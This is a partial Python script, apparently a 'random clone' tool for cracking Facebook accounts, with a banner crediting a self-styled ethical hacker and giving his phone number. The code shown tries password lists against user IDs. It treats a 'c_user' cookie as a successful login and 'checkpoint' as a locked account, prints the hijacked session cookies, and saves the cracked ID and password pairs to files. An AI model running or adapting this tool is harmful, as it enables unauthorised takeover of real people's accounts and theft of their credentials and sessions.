...
#    Respotary   Star  
#----------------------------------------------------------------------------------------------------------
#CREATE BY : SAUGAT  KAPCHAKI  MAGARR
#WHATSAPP : +9779842260519
#GITHUB : https://github.com/Saugat404
#----------------------------------------------------------------------------------------------------------
...
\___ \ / _ \| | | | |  _  / _ \ | |
 ___) / ___ \ |_| | |_| |/ ___ \| |
|____/_/   \_\___/ \____/_/   \_\_| CEH
==================================================
[] AUTHOR    : CERTIFIED ETHICAL HACKER 
[] TOOLS     : RANDOM CLONE
[] TYPE      : FREE
[] FACEBOOK  : SAUGAT MAGAR
[] WHATSAPP  : +9779842260519
==================================================""")
...
def fuck():
    ...
    print(' [+] OK Ids saved in SAUGAT/OK.txt')
    print(' [+] CP Ids saved in SAUGAT/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SAUGAT]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[SAUGAT-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/SAUGAT/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[SAUGAT-CP] {cid}|{ps}")
                open('/sdcard/SAUGAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
